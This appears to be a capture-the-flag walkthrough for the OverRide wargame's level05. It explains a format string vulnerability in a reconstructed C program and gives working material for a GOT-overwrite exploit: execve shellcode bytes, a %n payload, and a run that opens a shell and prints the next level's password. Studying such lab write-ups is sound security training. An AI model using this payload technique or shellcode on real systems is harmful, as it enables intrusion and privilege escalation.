# Level05

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char buffer[100]; // 0x28(%esp)
    int i = 0; // 0x8c(%esp)

    fgets(buffer, 100, stdin);
    i = 0;

    while (i < strlen(buffer))
    {
        if (buffer[i] > 0x40 && buffer[i] <= 0x5a) // 0x40 is '@', 0x5a is 'Z' aka if the character is uppercase
            buffer[i] ^= 0x20; // XOR with 0x20 (32) makes it lowercase
        i++;
    }

    printf(buffer);
    exit(0);
}
```

Let's focus on the `main` function. It reads input using the `fgets` function, which is known to be safe due to its mechanism to limit the number of bytes read. However, the `printf` function is known to be unsafe when user input is passed as the format argument, it's referred to as a format string vulnerability. Please refer to the [level02 walkthrough](../level02/walkthrough.md) for a detailed explanation of the format string vulnerability.

In this exercise, we have to write the address of our shellcode into the value that the GOT entry address for `exit` points to. This only works because `exit` is a function in the Procedure Linkage Table (PLT), a mechanism used in dynamic linking to call external functions. When a function like `exit` is called, the PLT initially redirects to the Global Offset Table (GOT) entry for the function, which then points back to the PLT and subsequently to the dynamic linker for the first call. Once the dynamic linker has been called, the GOT is updated with the address of the function, and the next time the function is called, the GOT will point directly to the function.
> Read more about that [here](https://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got).

Here you see the disassembly of the `exit` function:
```bash
(gdb) disass exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```

The PLT is the set of instructions you see (`jmp`, `push`, `jmp`).  
The GOT entry for the `exit` function is referenced by the address `0x80497e0`, which is used in the indirect jump instruction.

The `jmp *0x80497e0` instruction dereferences the address stored at `0x80497e0` and jumps to it. After our tampering, this will be the address of our shellcode.

So, first let's locate our input string on the stack:
```bash
level05@OverRide:~$ python -c 'print("AAAA %x %x %x %x %x %x %x %x %x %x")' | ./level05 
aaaa 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 61616161
```

In this output, 41414141, the hexadecimal representation of 'AAAA', is found at the tenth position.

Then, we need to set up our shellcode by exporting it as an environment variable:
```bash
export EXPLOIT=`python -c "print '\x90' * 200 + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
```

We'll use the following C program to find the address of the environment variable:
```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    printf("%p\n", getenv("EXPLOIT"));
    return 0;
}
```
```
level05@OverRide:/tmp$ ./env 
0xffffd82f
```
> That address will be different for you, you'll have to change it in the payload.

`0xffffd82f` in decimal is `4294957103`, that's bigger than INT_MAX therefore we'll have to cut it in half (2 bytes / 2 bytes).
> This is because the field width (or precision) of the `%n` format specifier is a 32-bit integer, so it can only handle values up to `INT_MAX` (2147483647).

Therefore, we'll have to write `0xffff` and `0xd82f` in the address `0x80497e0` and `0x80497e2` respectively. `0xffff` in decimal is `65535` and `0xd82f` in decimal is `55343`.
Let's construct our payload logic:
```
0x80497e0 / 0x80497e2
55343 (to write into 0x80497e0) + 65535 (to write into 0x80497e2)

Now because we already wrote 55343 bytes, we need to write 65535 - 55343 = 10192 bytes for the second value.
Futhermore, we already wrote 8 bytes for the adresses of the got entry for `exit` therefore 55343 - 8 = 55335 bytes for the first value.

Let's fix that:
0x80497e0 / 0x80497e2
55335 / 10192
```

Our actual payload:
```bash
(python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55335x%10$n%10192x%11$n")'; cat)| ./level05
```

Let's run it:
```bash
(python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55335x%10$n%10192x%11$n")'; cat)| ./level05
[...]
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

We are now level06! Let's move on to the next level.